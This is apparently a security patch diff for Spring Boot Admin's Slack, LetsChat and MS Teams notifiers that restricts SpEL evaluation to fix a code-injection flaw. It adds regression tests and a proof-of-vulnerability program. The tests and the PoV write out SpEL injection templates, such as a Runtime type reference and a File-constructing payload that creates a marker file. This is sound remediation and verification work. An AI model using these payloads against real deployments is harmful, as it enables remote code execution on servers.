@@ -1,0 +1,300 @@
+diff --git a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/LetsChatNotifier.java b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/LetsChatNotifier.java
+index eb126b2..c0334cb 100644
+--- a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/LetsChatNotifier.java
++++ b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/LetsChatNotifier.java
+@@ -27,7 +27,8 @@ import org.springframework.context.expression.MapAccessor;
+ import org.springframework.expression.Expression;
+ import org.springframework.expression.ParserContext;
+ import org.springframework.expression.spel.standard.SpelExpressionParser;
+-import org.springframework.expression.spel.support.StandardEvaluationContext;
++import org.springframework.expression.spel.support.DataBindingPropertyAccessor;
++import org.springframework.expression.spel.support.SimpleEvaluationContext;
+ import org.springframework.http.HttpEntity;
+ import org.springframework.http.HttpHeaders;
+ import org.springframework.http.HttpMethod;
+@@ -119,8 +120,9 @@ public class LetsChatNotifier extends AbstractStatusChangeNotifier {
+ 		root.put("event", event);
+ 		root.put("instance", instance);
+ 		root.put("lastStatus", getLastStatus(event.getInstance()));
+-		StandardEvaluationContext context = new StandardEvaluationContext(root);
+-		context.addPropertyAccessor(new MapAccessor());
++		SimpleEvaluationContext context = SimpleEvaluationContext
++				.forPropertyAccessors(new MapAccessor(), DataBindingPropertyAccessor.forReadOnlyAccess())
++				.withRootObject(root).build();
+ 		return message.getValue(context, String.class);
+ 	}
+ 
+diff --git a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifier.java b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifier.java
+index 09edea7..bb9c4be 100644
+--- a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifier.java
++++ b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifier.java
+@@ -30,10 +30,12 @@ import lombok.Data;
+ import org.slf4j.Logger;
+ import org.slf4j.LoggerFactory;
+ import org.springframework.context.expression.MapAccessor;
++import org.springframework.expression.EvaluationContext;
+ import org.springframework.expression.Expression;
+ import org.springframework.expression.ParserContext;
+ import org.springframework.expression.spel.standard.SpelExpressionParser;
+-import org.springframework.expression.spel.support.StandardEvaluationContext;
++import org.springframework.expression.spel.support.DataBindingPropertyAccessor;
++import org.springframework.expression.spel.support.SimpleEvaluationContext;
+ import org.springframework.http.HttpEntity;
+ import org.springframework.http.HttpHeaders;
+ import org.springframework.http.MediaType;
+@@ -141,7 +143,7 @@ public class MicrosoftTeamsNotifier extends AbstractStatusChangeNotifier {
+ 	@Override
+ 	protected Mono<Void> doNotify(InstanceEvent event, Instance instance) {
+ 		Message message;
+-		StandardEvaluationContext context = createEvaluationContext(event, instance);
++		EvaluationContext context = createEvaluationContext(event, instance);
+ 		if (event instanceof InstanceRegisteredEvent) {
+ 			message = getRegisteredMessage(instance, context);
+ 		}
+@@ -172,23 +174,23 @@ public class MicrosoftTeamsNotifier extends AbstractStatusChangeNotifier {
+ 				|| super.shouldNotify(event, instance);
+ 	}
+ 
+-	protected Message getDeregisteredMessage(Instance instance, StandardEvaluationContext context) {
++	protected Message getDeregisteredMessage(Instance instance, EvaluationContext context) {
+ 		String activitySubtitle = evaluateExpression(context, deregisterActivitySubtitle);
+ 		return createMessage(instance, deRegisteredTitle, activitySubtitle, context);
+ 	}
+ 
+-	protected Message getRegisteredMessage(Instance instance, StandardEvaluationContext context) {
++	protected Message getRegisteredMessage(Instance instance, EvaluationContext context) {
+ 		String activitySubtitle = evaluateExpression(context, registerActivitySubtitle);
+ 		return createMessage(instance, registeredTitle, activitySubtitle, context);
+ 	}
+ 
+-	protected Message getStatusChangedMessage(Instance instance, StandardEvaluationContext context) {
++	protected Message getStatusChangedMessage(Instance instance, EvaluationContext context) {
+ 		String activitySubtitle = evaluateExpression(context, statusActivitySubtitle);
+ 		return createMessage(instance, statusChangedTitle, activitySubtitle, context);
+ 	}
+ 
+ 	protected Message createMessage(Instance instance, String registeredTitle, String activitySubtitle,
+-			StandardEvaluationContext context) {
++			EvaluationContext context) {
+ 		List<Fact> facts = new ArrayList<>();
+ 		facts.add(new Fact(STATUS_KEY, instance.getStatusInfo().getStatus()));
+ 		facts.add(new Fact(SERVICE_URL_KEY, instance.getRegistration().getServiceUrl()));
+@@ -203,18 +205,18 @@ public class MicrosoftTeamsNotifier extends AbstractStatusChangeNotifier {
+ 				.themeColor(evaluateExpression(context, themeColor)).sections(singletonList(section)).build();
+ 	}
+ 
+-	protected String evaluateExpression(StandardEvaluationContext context, Expression expression) {
++	protected String evaluateExpression(EvaluationContext context, Expression expression) {
+ 		return Objects.requireNonNull(expression.getValue(context, String.class));
+ 	}
+ 
+-	protected StandardEvaluationContext createEvaluationContext(InstanceEvent event, Instance instance) {
++	protected EvaluationContext createEvaluationContext(InstanceEvent event, Instance instance) {
+ 		Map<String, Object> root = new HashMap<>();
+ 		root.put("event", event);
+ 		root.put("instance", instance);
+ 		root.put("lastStatus", getLastStatus(event.getInstance()));
+-		StandardEvaluationContext context = new StandardEvaluationContext(root);
+-		context.addPropertyAccessor(new MapAccessor());
+-		return context;
++		return SimpleEvaluationContext
++				.forPropertyAccessors(new MapAccessor(), DataBindingPropertyAccessor.forReadOnlyAccess())
++				.withRootObject(root).build();
+ 	}
+ 
+ 	@Nullable
+diff --git a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/SlackNotifier.java b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/SlackNotifier.java
+index dec6138..7d606c3 100644
+--- a/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/SlackNotifier.java
++++ b/spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/notify/SlackNotifier.java
+@@ -27,7 +27,8 @@ import org.springframework.context.expression.MapAccessor;
+ import org.springframework.expression.Expression;
+ import org.springframework.expression.ParserContext;
+ import org.springframework.expression.spel.standard.SpelExpressionParser;
+-import org.springframework.expression.spel.support.StandardEvaluationContext;
++import org.springframework.expression.spel.support.DataBindingPropertyAccessor;
++import org.springframework.expression.spel.support.SimpleEvaluationContext;
+ import org.springframework.http.HttpEntity;
+ import org.springframework.http.HttpHeaders;
+ import org.springframework.http.MediaType;
+@@ -128,8 +129,9 @@ public class SlackNotifier extends AbstractStatusChangeNotifier {
+ 		root.put("event", event);
+ 		root.put("instance", instance);
+ 		root.put("lastStatus", getLastStatus(event.getInstance()));
+-		StandardEvaluationContext context = new StandardEvaluationContext(root);
+-		context.addPropertyAccessor(new MapAccessor());
++		SimpleEvaluationContext context = SimpleEvaluationContext
++				.forPropertyAccessors(new MapAccessor(), DataBindingPropertyAccessor.forReadOnlyAccess())
++				.withRootObject(root).build();
+ 		return message.getValue(context, String.class);
+ 	}
+ 
+diff --git a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/LetsChatNotifierTest.java b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/LetsChatNotifierTest.java
+index ce41dc1..9a40a92 100644
+--- a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/LetsChatNotifierTest.java
++++ b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/LetsChatNotifierTest.java
+@@ -112,6 +112,16 @@ public class LetsChatNotifierTest {
+ 				eq(HttpMethod.POST), eq(expected), eq(Void.class));
+ 	}
+ 
++	@Test
++	public void test_setMessage_doesNotEvaluateCodeInjectionSpel() {
++		// A message template that attempts to construct arbitrary objects / invoke
++		// arbitrary code must not be executed during evaluation (CWE-094).
++		notifier.setMessage("#{T(java.lang.Runtime).getRuntime()}");
++		org.assertj.core.api.Assertions.assertThatThrownBy(() -> notifier.getText(
++				new InstanceStatusChangedEvent(instance.getId(), instance.getVersion(), StatusInfo.ofUp()), instance))
++				.isInstanceOf(org.springframework.expression.EvaluationException.class);
++	}
++
+ 	private HttpEntity<?> expectedMessage(String message) {
+ 		HttpHeaders httpHeaders = new HttpHeaders();
+ 		httpHeaders.setContentType(MediaType.APPLICATION_JSON);
+diff --git a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifierTest.java b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifierTest.java
+index 26b4bbd..a4cd224 100644
+--- a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifierTest.java
++++ b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/MicrosoftTeamsNotifierTest.java
+@@ -217,6 +217,18 @@ class MicrosoftTeamsNotifierTest {
+ 		assertThat(message.getThemeColor()).isEqualTo("green");
+ 	}
+ 
++	@Test
++	void test_setStatusActivitySubtitle_doesNotEvaluateCodeInjectionSpel() {
++		// A subtitle template that attempts to construct arbitrary objects / invoke
++		// arbitrary code must not be executed during evaluation (CWE-094).
++		notifier.setStatusActivitySubtitle("#{T(java.lang.Runtime).getRuntime()}");
++		org.assertj.core.api.Assertions
++				.assertThatThrownBy(() -> notifier.getStatusChangedMessage(instance,
++						notifier.createEvaluationContext(
++								new InstanceStatusChangedEvent(instance.getId(), 1L, StatusInfo.ofUp()), instance)))
++				.isInstanceOf(org.springframework.expression.EvaluationException.class);
++	}
++
+ 	private void assertMessage(Message message, String expectedTitle, String expectedSummary, String expectedSubTitle,
+ 			String expectedColor) {
+ 		assertThat(message.getTitle()).isEqualTo(expectedTitle);
+diff --git a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/SlackNotifierTest.java b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/SlackNotifierTest.java
+index 6bf9464..620bda2 100644
+--- a/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/SlackNotifierTest.java
++++ b/spring-boot-admin-server/src/test/java/de/codecentric/boot/admin/server/notify/SlackNotifierTest.java
+@@ -174,6 +174,16 @@ public class SlackNotifierTest {
+ 		verify(restTemplate).postForEntity(any(URI.class), eq(expected), eq(Void.class));
+ 	}
+ 
++	@Test
++	public void test_setMessage_doesNotEvaluateCodeInjectionSpel() {
++		// A message template that attempts to construct arbitrary objects / invoke
++		// arbitrary code must not be executed during evaluation (CWE-094).
++		notifier.setMessage("#{T(java.lang.Runtime).getRuntime()}");
++		org.assertj.core.api.Assertions.assertThatThrownBy(() -> notifier.getText(
++				new InstanceStatusChangedEvent(INSTANCE.getId(), INSTANCE.getVersion(), StatusInfo.ofUp()), INSTANCE))
++				.isInstanceOf(org.springframework.expression.EvaluationException.class);
++	}
++
+ 	private HttpEntity<Map<String, Object>> expectedMessage(String color, String user, String icon, String channel,
+ 			String message) {
+ 		Map<String, Object> messageJson = new HashMap<>();
+diff --git a/.security-pipeline/pov/SpelInjectionPov.java b/.security-pipeline/pov/SpelInjectionPov.java
+new file mode 100644
+index 0000000..6744192
+--- /dev/null
++++ b/.security-pipeline/pov/SpelInjectionPov.java
+@@ -0,0 +1,98 @@
++/*
++ * Proof-of-Vulnerability for CWE-094 (SpEL code injection) in Spring Boot Admin
++ * notifier configuration templates.
++ *
++ * The notifiers (LetsChatNotifier, SlackNotifier, MicrosoftTeamsNotifier) take
++ * operator-supplied configuration strings (e.g. `notify.slack.message`,
++ * `notify.ms-teams.theme-color`, `notify.hipchat...`) and feed them straight
++ * into a SpelExpressionParser using a StandardEvaluationContext. A
++ * StandardEvaluationContext permits arbitrary type references, constructor
++ * invocation and method calls, so any actor able to influence that configuration
++ * value achieves arbitrary code execution when a notification fires.
++ *
++ * This POV drives the real, unmodified product code:
++ *   - SlackNotifier.setMessage(String)   -> parses the attacker template
++ *   - SlackNotifier.getText(event, inst) -> evaluates it (SpEL RCE sink)
++ *
++ * The attacker template constructs a java.io.File and calls createNewFile(),
++ * proving arbitrary object construction / method invocation (i.e. code
++ * execution). If the payload runs, a marker file appears on disk.
++ *
++ * Vulnerable (unpatched) code  -> marker created -> exit 0
++ * Patched code (restricted SpEL, e.g. SimpleEvaluationContext / no type refs)
++ *                              -> constructor/method call blocked or rejected,
++ *                                 marker NOT created -> exit 1
++ *
++ * The class lives in the notifier package so that the protected getText()
++ * sink can be exercised directly.
++ */
++package de.codecentric.boot.admin.server.notify;
++
++import java.io.File;
++
++import org.springframework.web.client.RestTemplate;
++
++import de.codecentric.boot.admin.server.domain.entities.Instance;
++import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;
++import de.codecentric.boot.admin.server.domain.events.InstanceEvent;
++import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;
++import de.codecentric.boot.admin.server.domain.values.InstanceId;
++import de.codecentric.boot.admin.server.domain.values.Registration;
++import de.codecentric.boot.admin.server.domain.values.StatusInfo;
++
++public class SpelInjectionPov {
++
++	public static void main(String[] args) throws Exception {
++		// Unique marker that the injected SpEL payload will create if code
++		// injection succeeds.
++		File marker = new File(System.getProperty("java.io.tmpdir"), "sba_spel_pov_marker_" + System.nanoTime());
++		if (marker.exists()) {
++			marker.delete();
++		}
++
++		// Attacker-controlled notifier configuration value. In production this
++		// comes from application properties (notify.slack.message), an env var,
++		// or any externalized configuration source the attacker can influence.
++		// It uses SpEL's type-reference + constructor + method-call features,
++		// none of which should ever be reachable from a notification template.
++		String maliciousTemplate = "#{new java.io.File('" + marker.getAbsolutePath().replace("'", "''")
++				+ "').createNewFile()}";
++
++		// Build a real Instance / event, exactly like the product does at runtime.
++		Instance instance = Instance.create(InstanceId.of("-pov-id-"))
++				.register(Registration.create("PoVApp", "http://health").build());
++		InstanceEvent event = new InstanceStatusChangedEvent(instance.getId(), instance.getVersion(),
++				StatusInfo.ofDown());
++
++		// Exercise the genuine product class. repository is unused on this path.
++		SlackNotifier notifier = new SlackNotifier((InstanceRepository) null, new RestTemplate());
++		notifier.setMessage(maliciousTemplate);
++
++		String rendered = null;
++		try {
++			// getText() is the SpEL evaluation sink (SlackNotifier.java line ~133).
++			rendered = notifier.getText(event, instance);
++		}
++		catch (Throwable t) {
++			// A hardened/patched notifier rejects the dangerous expression here
++			// (e.g. SpelEvaluationException for type/constructor access). That is
++			// the SAFE outcome; the marker will not exist and we exit non-zero.
++			System.out.println("[pov] getText threw (payload rejected): " + t);
++		}
++
++		boolean executed = marker.exists();
++		System.out.println("[pov] payload template : " + maliciousTemplate);
++		System.out.println("[pov] rendered value   : " + rendered);
++		System.out.println("[pov] marker created   : " + executed + " (" + marker.getAbsolutePath() + ")");
++
++		if (executed) {
++			marker.delete();
++			System.out.println("[pov] VULNERABLE: attacker-controlled SpEL template executed arbitrary code.");
++			System.exit(0);
++		}
++
++		System.out.println("[pov] NOT VULNERABLE: SpEL code injection was blocked.");
++		System.exit(1);
++	}
++
++}
